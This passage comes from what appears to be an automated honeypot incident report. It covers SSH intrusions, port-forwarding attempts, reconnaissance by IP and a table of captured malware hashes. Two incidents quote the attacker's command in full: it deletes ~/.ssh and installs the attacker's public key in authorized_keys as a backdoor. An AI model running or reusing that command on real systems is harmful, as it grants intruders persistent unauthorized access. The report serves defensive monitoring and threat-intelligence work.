| `2026-09-03 06:18:28` | `cowrie.client.version` |
| `2026-09-03 06:18:28` | `cowrie.client.kex` |
| `2026-09-03 06:18:29` | `cowrie.login.success` |
| `2026-09-03 06:18:29` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:18:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:18:29` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-329ec4acd7eb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-09-03 06:20 |
| **Last Seen** | 2026-09-03 06:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:20:55` | `cowrie.session.connect` |
| `2026-09-03 06:20:55` | `cowrie.client.version` |
| `2026-09-03 06:20:55` | `cowrie.client.kex` |
| `2026-09-03 06:20:55` | `cowrie.login.success` |
| `2026-09-03 06:20:56` | `cowrie.session.params` |
| `2026-09-03 06:20:56` | `cowrie.command.input` |
| `2026-09-03 06:20:56` | `cowrie.command.failed` |
| `2026-09-03 06:20:56` | `cowrie.log.closed` |
| `2026-09-03 06:20:57` | `cowrie.session.params` |
| `2026-09-03 06:20:57` | `cowrie.command.input` |
| `2026-09-03 06:20:57` | `cowrie.session.file_download` |
| `2026-09-03 06:20:57` | `cowrie.log.closed` |
| `2026-09-03 06:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4621ab63d18

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-09-03 06:20 |
| **Last Seen** | 2026-09-03 06:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:20:57` | `cowrie.session.connect` |
| `2026-09-03 06:20:57` | `cowrie.client.version` |
| `2026-09-03 06:20:57` | `cowrie.client.kex` |
| `2026-09-03 06:20:58` | `cowrie.login.success` |
| `2026-09-03 06:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f517ace802d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-09-03 06:20 |
| **Last Seen** | 2026-09-03 06:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:20:58` | `cowrie.session.connect` |
| `2026-09-03 06:20:58` | `cowrie.client.version` |
| `2026-09-03 06:20:58` | `cowrie.client.kex` |
| `2026-09-03 06:20:59` | `cowrie.login.success` |
| `2026-09-03 06:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f32f7c943b60

| Field | Detail |
|---|---|
| **Source IP** | `14.103.103[.]211` |
| **First Seen** | 2026-09-03 06:21 |
| **Last Seen** | 2026-09-03 06:22 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:21:56` | `cowrie.session.connect` |
| `2026-09-03 06:21:56` | `cowrie.client.version` |
| `2026-09-03 06:21:57` | `cowrie.client.kex` |
| `2026-09-03 06:21:59` | `cowrie.login.success` |
| `2026-09-03 06:22:00` | `cowrie.session.params` |
| `2026-09-03 06:22:00` | `cowrie.command.input` |
| `2026-09-03 06:22:00` | `cowrie.command.failed` |
| `2026-09-03 06:22:00` | `cowrie.log.closed` |
| `2026-09-03 06:22:01` | `cowrie.session.params` |
| `2026-09-03 06:22:01` | `cowrie.command.input` |
| `2026-09-03 06:22:02` | `cowrie.session.file_download` |
| `2026-09-03 06:22:02` | `cowrie.log.closed` |
| `2026-09-03 06:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.103[.]211` to AbuseIPDB if not already reported
- [ ] Block `14.103.103[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b76f7a2358d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.103[.]211` |
| **First Seen** | 2026-09-03 06:22 |
| **Last Seen** | 2026-09-03 06:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:22:07` | `cowrie.session.connect` |
| `2026-09-03 06:22:08` | `cowrie.client.version` |
| `2026-09-03 06:22:11` | `cowrie.client.kex` |
| `2026-09-03 06:22:12` | `cowrie.login.success` |
| `2026-09-03 06:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.103[.]211` to AbuseIPDB if not already reported
- [ ] Block `14.103.103[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a88becb59bcc

| Field | Detail |
|---|---|
| **Source IP** | `14.103.103[.]211` |
| **First Seen** | 2026-09-03 06:22 |
| **Last Seen** | 2026-09-03 06:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:22:17` | `cowrie.session.connect` |
| `2026-09-03 06:22:17` | `cowrie.client.version` |
| `2026-09-03 06:22:19` | `cowrie.client.kex` |
| `2026-09-03 06:22:20` | `cowrie.login.success` |
| `2026-09-03 06:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.103[.]211` to AbuseIPDB if not already reported
- [ ] Block `14.103.103[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b9c4365aa4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:27 |
| **Last Seen** | 2026-09-03 06:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:27:29` | `cowrie.session.connect` |
| `2026-09-03 06:27:29` | `cowrie.client.version` |
| `2026-09-03 06:27:29` | `cowrie.client.kex` |
| `2026-09-03 06:27:30` | `cowrie.login.success` |
| `2026-09-03 06:27:30` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:27:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:27:30` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2daf885c1a9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:29 |
| **Last Seen** | 2026-09-03 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:29:06` | `cowrie.session.connect` |
| `2026-09-03 06:29:06` | `cowrie.client.version` |
| `2026-09-03 06:29:07` | `cowrie.client.kex` |
| `2026-09-03 06:29:07` | `cowrie.login.success` |
| `2026-09-03 06:29:08` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:29:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:29:08` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d07e04ebf2a7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:37 |
| **Last Seen** | 2026-09-03 06:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:37:02` | `cowrie.session.connect` |
| `2026-09-03 06:37:02` | `cowrie.client.version` |
| `2026-09-03 06:37:02` | `cowrie.client.kex` |
| `2026-09-03 06:37:03` | `cowrie.login.success` |
| `2026-09-03 06:37:03` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:37:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:37:03` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94f29730d0ec

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:39 |
| **Last Seen** | 2026-09-03 06:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:39:41` | `cowrie.session.connect` |
| `2026-09-03 06:39:41` | `cowrie.client.version` |
| `2026-09-03 06:39:41` | `cowrie.client.kex` |
| `2026-09-03 06:39:42` | `cowrie.login.success` |
| `2026-09-03 06:39:42` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:39:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:39:42` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f669210b5b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 06:40 |
| **Last Seen** | 2026-09-03 06:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:40:30` | `cowrie.session.connect` |
| `2026-09-03 06:40:30` | `cowrie.client.version` |
| `2026-09-03 06:40:30` | `cowrie.client.kex` |
| `2026-09-03 06:40:30` | `cowrie.login.success` |
| `2026-09-03 06:40:31` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:40:31` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7b5b2c62638

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:46 |
| **Last Seen** | 2026-09-03 06:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:46:24` | `cowrie.session.connect` |
| `2026-09-03 06:46:24` | `cowrie.client.version` |
| `2026-09-03 06:46:24` | `cowrie.client.kex` |
| `2026-09-03 06:46:25` | `cowrie.login.success` |
| `2026-09-03 06:46:25` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:46:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:46:25` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31a55f9679ca

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:50 |
| **Last Seen** | 2026-09-03 06:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:50:32` | `cowrie.session.connect` |
| `2026-09-03 06:50:32` | `cowrie.client.version` |
| `2026-09-03 06:50:32` | `cowrie.client.kex` |
| `2026-09-03 06:50:33` | `cowrie.login.success` |
| `2026-09-03 06:50:33` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:50:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:50:33` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🟡 MEDIUM · IR-f5ae2e1e49a8

| Field | Detail |
|---|---|
| **Source IP** | `103.163.46[.]207` |
| **First Seen** | 2026-09-03 02:55 |
| **Last Seen** | 2026-09-03 02:55 |
| **Session Duration** | 122s |
| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `uname -s -m` |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 02:55:12` | `cowrie.session.params` |
| `2026-09-03 02:55:12` | `cowrie.command.input` |
| `2026-09-03 02:55:16` | `cowrie.log.closed` |
| `2026-09-03 02:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Monitor for repeat activity from `103.163.46[.]207`
- [ ] No immediate escalation required

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `51.158.205[.]203` | **6** | 2026-09-03 04:25 | 2026-09-03 04:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `190.194.252[.]3` | **3** | 2026-09-03 04:48 | 2026-09-03 04:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]87` | **3** | 2026-09-03 05:49 | 2026-09-03 05:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `201.220.112[.]104` | **3** | 2026-09-03 05:25 | 2026-09-03 05:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `119.96.159[.]237` | **2** | 2026-09-03 05:58 | 2026-09-03 06:20 | 4m | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | **2** | 2026-09-03 03:04 | 2026-09-03 03:27 | 2m | 0 | `T1592` | 🟢 LOW |
| `46.98.62[.]130` | **2** | 2026-09-03 06:54 | 2026-09-03 06:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.218.178[.]134` | **2** | 2026-09-03 05:08 | 2026-09-03 05:10 | 2m | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]196` | **2** | 2026-09-03 03:49 | 2026-09-03 04:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.229[.]2` | 1 | 2026-09-03 06:41 | 2026-09-03 06:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.151[.]242` | 1 | 2026-09-03 06:26 | 2026-09-03 06:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.29.34[.]90` | 1 | 2026-09-03 05:47 | 2026-09-03 05:48 | 42s | 0 | `T1592` | 🟢 LOW |
| `121.229.13[.]210` | 1 | 2026-09-03 05:58 | 2026-09-03 06:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]89` | 1 | 2026-09-03 04:19 | 2026-09-03 04:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `136.244.94[.]246` | 1 | 2026-09-03 05:06 | 2026-09-03 05:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `171.40.10[.]234` | 1 | 2026-09-03 06:42 | 2026-09-03 06:43 | 11s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]49` | 1 | 2026-09-03 05:36 | 2026-09-03 05:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-09-03 06:08 | 2026-09-03 06:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.206.182[.]205` | 1 | 2026-09-03 05:35 | 2026-09-03 05:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.247.9[.]49` | 1 | 2026-09-03 05:35 | 2026-09-03 05:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `202.103.55[.]158` | 1 | 2026-09-03 03:27 | 2026-09-03 03:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `24.75.165[.]67` | 1 | 2026-09-03 05:43 | 2026-09-03 05:43 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-09-03 04:02 | 2026-09-03 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-09-03 05:35 | 2026-09-03 05:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.8.35[.]58` | 1 | 2026-09-03 06:06 | 2026-09-03 06:06 | 12s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]4` | 1 | 2026-09-03 06:30 | 2026-09-03 06:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]9` | 1 | 2026-09-03 06:45 | 2026-09-03 06:45 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
